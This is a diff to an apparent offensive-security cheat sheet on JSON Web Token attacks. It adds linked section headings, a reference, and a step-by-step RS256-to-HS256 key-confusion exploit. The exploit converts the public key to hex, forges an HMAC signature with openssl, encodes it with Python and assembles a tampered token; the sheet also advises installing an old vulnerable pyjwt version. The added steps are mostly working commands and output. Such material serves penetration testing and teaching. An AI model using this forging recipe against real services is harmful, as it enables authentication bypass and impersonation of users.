@@ -4,10 +4,15 @@
 
 ## Summary 
 
-- JWT Format
-- JWT Signature - None algorithm
-- JWT Signature - RS256 to HS256
-- Breaking JWT's secret
+- [Tools](#tools)
+- [JWT Format](#jwt-format)
+- [JWT Signature - None algorithm](#jwt-signature---none-algorithm)
+- [JWT Signature - RS256 to HS256](#jwt-signature---rs256-to-hs256)
+- [Breaking JWT's secret](#breaking-jwts-secret)
+    - [JWT Tool](#jwt-tool)
+    - [JWT cracker](#jwt-cracker)
+    - [Hashcat](#hashcat)
+- [References](#references)
 
 ## Tools
 
@@ -118,9 +123,39 @@ print public
 print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
 ```
 
-Note: This behavior is fixed in the python library and will return this error `jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.`. You need to install the following version
+:warning: This behavior is fixed in the python library and will return this error `jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.`. You need to install the following version
 
 `pip install pyjwt==0.4.3`.
+
+Here are the steps to edit an RS256 JWT token into an HS256
+
+1. Convert our public key (key.pem) into HEX with this command.
+
+    ```powershell
+    $ cat key.pem | xxd -p | tr -d "\\n"
+    2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
+    ```
+
+2. Generate HMAC signature by supplying our public key as ASCII hex and with our token previously edited.
+
+    ```powershell
+    $ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
+
+    (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
+    ```
+
+3. Convert signature (Hex to "base64 URL")
+
+    ```powershell
+    $ python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\")"
+    ```
+
+4. Add signature to edited payload
+
+    ```powershell
+    [HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE]
+    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA
+    ```
 
 ## Breaking JWT's secret
 
@@ -232,3 +267,4 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret
 - [Attacking JWT authentication - Sep 28, 2016 - Sjoerd Langkemper](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
 - [How to Hack a Weak JWT Implementation with a Timing Attack - Jan 7, 2017 - Tamas Polgar](https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9)
 - [HACKING JSON WEB TOKENS, FROM ZERO TO HERO WITHOUT EFFORT - Thu Feb 09 2017 - @pdp](https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
+- [Write up – JRR Token – LeHack 2019 - 07/07/2019 - LAPHAZE](http://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)
